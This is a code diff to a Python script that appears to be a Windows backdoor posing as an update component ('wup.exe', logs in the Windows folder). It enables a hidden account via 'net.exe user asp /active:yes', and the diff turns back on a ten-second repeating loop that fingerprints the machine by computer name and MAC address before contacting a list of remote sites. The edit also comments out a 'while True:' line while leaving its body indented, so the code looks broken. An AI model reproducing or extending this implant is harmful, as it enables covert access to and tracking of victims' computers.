@@ -174,7 +174,7 @@ def Init():
                         os.system("net.exe user asp /active:yes")
                         sinit='1'
 def myloop():
-#    threading.Timer(10.0, myloop).start() # called every minute   
+    threading.Timer(10.0, myloop).start() # called every minute   
     sinit='0'
     #sites = ["paner.altervista.org", "verifiche.ddns.net"]
 #    ua = UserAgent()
@@ -193,36 +193,36 @@ def myloop():
 
     
     
-    #header = {'User-Agent': 'Mozilla/5.0'}
+    header = {'User-Agent': 'Mozilla/5.0'}
     #print(header)
     
     
-#    log_formatter = logging.Formatter('%(asctime)s %(message)s', datefmt='%m/%d/%Y %I:%M:%S %p')
+    log_formatter = logging.Formatter('%(asctime)s %(message)s', datefmt='%m/%d/%Y %I:%M:%S %p')
 
-#    logFile = os.getenv('windir')+"\\wup.log"
+    logFile = os.getenv('windir')+"\\wup.log"
 
-#    my_handler = RotatingFileHandler(logFile, mode='a', maxBytes=1*1024, 
-#                                 backupCount=2, encoding=None, delay=0)
-#    my_handler.setFormatter(log_formatter)
-#    my_handler.setLevel(logging.INFO)
+    my_handler = RotatingFileHandler(logFile, mode='a', maxBytes=1*1024, 
+                                 backupCount=2, encoding=None, delay=0)
+    my_handler.setFormatter(log_formatter)
+    my_handler.setLevel(logging.INFO)
 
-#    app_log = logging.getLogger('root')
-#    app_log.setLevel(logging.INFO)
+    app_log = logging.getLogger('root')
+    app_log.setLevel(logging.INFO)
 
-#    app_log.addHandler(my_handler)
+    app_log.addHandler(my_handler)
 
 
-    #app_log.info("data")
+    app_log.info("data")
     
     
-    #logging.basicConfig(filename=os.getenv('windir')+"\\wup.log",level=logging.INFO, format='%(asctime)s %(message)s', datefmt='%m/%d/%Y %I:%M:%S %p')
-#    app_log.info('Start')
+    logging.basicConfig(filename=os.getenv('windir')+"\\wup.log",level=logging.INFO, format='%(asctime)s %(message)s', datefmt='%m/%d/%Y %I:%M:%S %p')
+    app_log.info('Start')
     
     
 
     
     
-while True:
+#while True:
 
     
     for site in sites:
@@ -234,7 +234,7 @@ while True:
               #httpServ = httplib.HTTPConnection(site, 80)
               #httpServ.connect()
               
-#              mymac = get_mac()
+              mymac = get_mac()
               smacaddress = get_macaddress('localhost')
               sCOMPUTERNAME=os.getenv('COMPUTERNAME')+"_"+smacaddress
               sTime=time.ctime(os.path.getmtime(os.getenv('windir')+"\\wup.exe"))
